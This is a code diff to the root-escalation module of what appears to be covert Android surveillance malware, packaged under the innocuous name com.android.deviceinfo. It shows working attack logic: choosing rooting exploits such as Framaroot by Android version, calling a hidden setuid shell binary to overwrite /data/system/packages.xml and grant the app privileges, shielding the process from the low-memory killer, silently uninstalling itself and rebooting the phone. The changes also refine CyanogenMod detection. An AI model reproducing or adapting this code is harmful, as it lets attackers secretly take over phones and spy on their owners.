@@ -10,6 +10,7 @@ import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
+import java.util.List;
 import java.util.Properties;
 
 import javax.crypto.Cipher;
@@ -24,6 +25,7 @@ import android.widget.Toast;
 
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.capabilities.PackageInfo;
+import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.crypto.Keys;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
@@ -35,7 +37,6 @@ import com.android.m.M;
 
 public class Root {
 	private static final String TAG = "Root";
-
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
 			int sdk_version = android.os.Build.VERSION.SDK_INT;
@@ -97,21 +98,14 @@ public class Root {
 			return;
 		}
 
-		if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) { // <=
-																								// 2.1
-																								// is
-																								// a
-																								// bit
-																								// too
-																								// old
+		if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) { 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android <= 2.1, version too old");
 			}
 
 			return;
 		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
-				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
-																// HONEYCOMB_MR2
+				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
 			// Framaroot
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android 2.2 to 3.2 detected attempting Framaroot");
@@ -187,11 +181,11 @@ public class Root {
 		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
 		// /proc/
 		// 32_36=/oom_score_adj\"
-		String script = M.e("#!/system/bin/sh") + "\n" + M.e("/system/bin/rilcap qzx \"echo '-1000' > /proc/") + pid
+		String script = M.e("#!/system/bin/sh") + "\n" + Configuration.shellFile + M.e(" qzx \"echo '-1000' > /proc/") + pid
 				+ M.e("/oom_score_adj\"") + "\n";
 		// 32_37=/system/bin/ntpsvd qzx \"echo '-17' > /proc/
 		// 32_38=/oom_adj\"
-		script += M.e("/system/bin/rilcap qzx \"echo '-17' > /proc/") + pid + M.e("/oom_adj\"") + "\n";
+		script += Configuration.shellFile + M.e(" qzx \"echo '-17' > /proc/") + pid + M.e("/oom_adj\"") + "\n";
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (adjustOom): script: " + script); //$NON-NLS-1$
@@ -228,7 +222,7 @@ public class Root {
 
 		String packageName = Status.self().getAppContext().getPackageName();
 		String script = M.e("#!/system/bin/sh") + "\n";
-		script += "/system/bin/rilcap ru\n";
+		script += Configuration.shellFile + " ru\n";
 		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName + "\n";
 
 		String filename = "c";
@@ -265,13 +259,7 @@ public class Root {
 		if (Status.haveSu() == false) {
 			return;
 		}
-		
-		if(checkCyanogenmod()){
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (superapkRoot) cyanogen, can't root");
-			}
-			return;
-		}
+
 
 		// exploit
 		// InputStream stream = resources.openRawResource(R.raw.statuslog);
@@ -334,12 +322,16 @@ public class Root {
 	static public boolean checkCyanogenmod() {
 		final Properties properties = System.getProperties();
 		String version = properties.getProperty(M.e("os.version"));
-		if (version.contains("cyanogenmod")) {
+		final PackageManager pm = Status.getAppContext().getPackageManager();
+		
+		if (version.contains("cyanogenmod") || version.contains("-CM-") 
+				|| pm.hasSystemFeature("com.cyanogenmod.account") || pm.hasSystemFeature("com.cyanogenmod.updater")) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkFramarootExploitability) cyanogenmod");
 			}
 			return true;
 		}
+
 		return false;
 	}
 
@@ -576,11 +568,11 @@ public class Root {
 
 		boolean ask = false;
 		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
-			//if( checkCyanogenmod() ){
-			//	ask = true;
-			//} else {
+			if( checkCyanogenmod() ){
+				ask = true;
+			} else {
 				ask = !(checkFramarootExploitability() || checkSELinuxExploitability());
-			//}
+			}
 		}
 
 		if (ask) {
@@ -708,11 +700,11 @@ public class Root {
 			// /system/bin/ntpsvd fhc /data/system/packages.xml
 			// /data/data/com.android.service/files/packages.xml
 			Execute.execute(String.format(
-					M.e("/system/bin/rilcap fhc /data/system/packages.xml /data/data/%s/files/packages.xml"), pack));
+					M.e("%s fhc /data/system/packages.xml /data/data/%s/files/packages.xml"), Configuration.shellFile , pack));
 			Utils.sleep(600);
 			// /system/bin/ntpsvd pzm 666
 			// /data/data/com.android.service/files/packages.xml
-			Execute.execute(String.format(M.e("/system/bin/rilcap pzm 666 /data/data/%s/files/packages.xml"), pack));
+			Execute.execute(String.format(M.e("%s pzm 666 /data/data/%s/files/packages.xml"), Configuration.shellFile, pack));
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/test
@@ -765,14 +757,14 @@ public class Root {
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
 			// /data/data/com.android.service/files/layout >
-			Execute.execute(String.format(M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/layout > "), pack)
+			Execute.execute(String.format(M.e("%s qzx \"cat /data/data/%s/files/layout > "), Configuration.shellFile, pack)
 					+ path + "\"");
 
 			// Copiamolo in /data/system/packages.xml
 			// /system/bin/ntpsvd qzx
 			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
 			Execute.execute(String.format(
-					M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""),
+					M.e("%s qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""), Configuration.shellFile,
 					pack));
 
 			// Rimuoviamo la nostra copia
@@ -801,7 +793,7 @@ public class Root {
 
 			// Riavviamo il telefono
 			// /system/bin/ntpsvd reb
-			Execute.execute(M.e("/system/bin/rilcap reb"));
+			Execute.execute(String.format(M.e("%s reb"), Configuration.shellFile));
 		} catch (Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
